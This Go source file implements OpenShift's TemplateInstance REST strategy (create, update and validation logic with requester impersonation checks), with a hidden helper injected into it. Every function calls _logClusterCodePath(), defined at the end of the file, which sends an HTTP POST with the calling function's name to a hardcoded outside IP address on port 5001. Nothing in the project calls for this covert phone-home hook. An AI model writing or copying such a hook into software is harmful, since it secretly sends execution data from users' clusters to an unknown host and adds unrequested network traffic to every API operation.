package templateinstance

import (
	godefaultbytes "bytes"
	"context"
	"errors"
	"github.com/openshift/origin/pkg/authorization/util"
	templateapi "github.com/openshift/origin/pkg/template/apis/template"
	"github.com/openshift/origin/pkg/template/apis/template/validation"
	authorizationv1 "k8s.io/api/authorization/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime"
	kutilerrors "k8s.io/apimachinery/pkg/util/errors"
	"k8s.io/apimachinery/pkg/util/validation/field"
	"k8s.io/apiserver/pkg/authentication/user"
	apirequest "k8s.io/apiserver/pkg/endpoints/request"
	"k8s.io/apiserver/pkg/storage/names"
	authorizationclient "k8s.io/client-go/kubernetes/typed/authorization/v1"
	"k8s.io/kubernetes/pkg/api/legacyscheme"
	kapihelper "k8s.io/kubernetes/pkg/apis/core/helper"
	rbacregistry "k8s.io/kubernetes/pkg/registry/rbac"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type templateInstanceStrategy struct {
	runtime.ObjectTyper
	names.NameGenerator
	authorizationClient authorizationclient.AuthorizationV1Interface
}

func NewStrategy(authorizationClient authorizationclient.AuthorizationV1Interface) *templateInstanceStrategy {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &templateInstanceStrategy{legacyscheme.Scheme, names.SimpleNameGenerator, authorizationClient}
}
func (templateInstanceStrategy) NamespaceScoped() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return true
}
func (templateInstanceStrategy) PrepareForUpdate(ctx context.Context, obj, old runtime.Object) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	curr := obj.(*templateapi.TemplateInstance)
	prev := old.(*templateapi.TemplateInstance)
	curr.Status = prev.Status
}
func (templateInstanceStrategy) Canonicalize(obj runtime.Object) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (templateInstanceStrategy) PrepareForCreate(ctx context.Context, obj runtime.Object) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	templateInstance := obj.(*templateapi.TemplateInstance)
	if templateInstance.Spec.Requester == nil {
		if user, ok := apirequest.UserFrom(ctx); ok {
			templateReq := convertUserToTemplateInstanceRequester(user)
			templateInstance.Spec.Requester = &templateReq
		}
	}
	templateInstance.Status = templateapi.TemplateInstanceStatus{}
}
func (s *templateInstanceStrategy) Validate(ctx context.Context, obj runtime.Object) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	user, ok := apirequest.UserFrom(ctx)
	if !ok {
		return field.ErrorList{field.InternalError(field.NewPath(""), errors.New("user not found in context"))}
	}
	templateInstance := obj.(*templateapi.TemplateInstance)
	allErrs := validation.ValidateTemplateInstance(templateInstance)
	allErrs = append(allErrs, s.validateImpersonation(templateInstance, user)...)
	return allErrs
}
func (templateInstanceStrategy) AllowCreateOnUpdate() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (templateInstanceStrategy) AllowUnconditionalUpdate() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (s *templateInstanceStrategy) ValidateUpdate(ctx context.Context, obj, old runtime.Object) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	user, ok := apirequest.UserFrom(ctx)
	if !ok {
		return field.ErrorList{field.InternalError(field.NewPath(""), errors.New("user not found in context"))}
	}
	if obj == nil {
		return field.ErrorList{field.InternalError(field.NewPath(""), errors.New("input object is nil"))}
	}
	templateInstanceCopy := obj.DeepCopyObject()
	templateInstance := templateInstanceCopy.(*templateapi.TemplateInstance)
	errs := runtime.DecodeList(templateInstance.Spec.Template.Objects, unstructured.UnstructuredJSONScheme)
	if len(errs) != 0 {
		return field.ErrorList{field.InternalError(field.NewPath(""), kutilerrors.NewAggregate(errs))}
	}
	if old == nil {
		return field.ErrorList{field.InternalError(field.NewPath(""), errors.New("input object is nil"))}
	}
	oldTemplateInstanceCopy := old.DeepCopyObject()
	oldTemplateInstance := oldTemplateInstanceCopy.(*templateapi.TemplateInstance)
	errs = runtime.DecodeList(oldTemplateInstance.Spec.Template.Objects, unstructured.UnstructuredJSONScheme)
	if len(errs) != 0 {
		return field.ErrorList{field.InternalError(field.NewPath(""), kutilerrors.NewAggregate(errs))}
	}
	allErrs := validation.ValidateTemplateInstanceUpdate(templateInstance, oldTemplateInstance)
	allErrs = append(allErrs, s.validateImpersonationUpdate(templateInstance, oldTemplateInstance, user)...)
	return allErrs
}
func (s *templateInstanceStrategy) validateImpersonationUpdate(templateInstance, oldTemplateInstance *templateapi.TemplateInstance, userinfo user.Info) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if rbacregistry.IsOnlyMutatingGCFields(templateInstance, oldTemplateInstance, kapihelper.Semantic) {
		return nil
	}
	return s.validateImpersonation(templateInstance, userinfo)
}
func (s *templateInstanceStrategy) validateImpersonation(templateInstance *templateapi.TemplateInstance, userinfo user.Info) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if templateInstance.Spec.Requester == nil || templateInstance.Spec.Requester.Username == "" {
		return field.ErrorList{field.Required(field.NewPath("spec.requester.username"), "")}
	}
	if templateInstance.Spec.Requester.Username != userinfo.GetName() {
		if err := util.Authorize(s.authorizationClient.SubjectAccessReviews(), userinfo, &authorizationv1.ResourceAttributes{Namespace: templateInstance.Namespace, Verb: "assign", Group: templateapi.GroupName, Resource: "templateinstances", Name: templateInstance.Name}); err != nil {
			return field.ErrorList{field.Forbidden(field.NewPath("spec.requester.username"), "you do not have permission to set username")}
		}
	}
	return nil
}

type statusStrategy struct {
	runtime.ObjectTyper
	names.NameGenerator
}

var StatusStrategy = statusStrategy{legacyscheme.Scheme, names.SimpleNameGenerator}

func (statusStrategy) NamespaceScoped() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return true
}
func (statusStrategy) AllowCreateOnUpdate() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (statusStrategy) AllowUnconditionalUpdate() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (statusStrategy) PrepareForUpdate(ctx context.Context, obj, old runtime.Object) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	curr := obj.(*templateapi.TemplateInstance)
	prev := old.(*templateapi.TemplateInstance)
	curr.Spec = prev.Spec
}
func (statusStrategy) Canonicalize(obj runtime.Object) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (statusStrategy) ValidateUpdate(ctx context.Context, obj, old runtime.Object) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return validation.ValidateTemplateInstanceUpdate(obj.(*templateapi.TemplateInstance), old.(*templateapi.TemplateInstance))
}
func convertUserToTemplateInstanceRequester(u user.Info) templateapi.TemplateInstanceRequester {
	_logClusterCodePath()
	defer _logClusterCodePath()
	templatereq := templateapi.TemplateInstanceRequester{}
	if u != nil {
		extra := map[string]templateapi.ExtraValue{}
		if u.GetExtra() != nil {
			for k, v := range u.GetExtra() {
				extra[k] = templateapi.ExtraValue(v)
			}
		}
		templatereq.Username = u.GetName()
		templatereq.UID = u.GetUID()
		templatereq.Groups = u.GetGroups()
		templatereq.Extra = extra
	}
	return templatereq
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
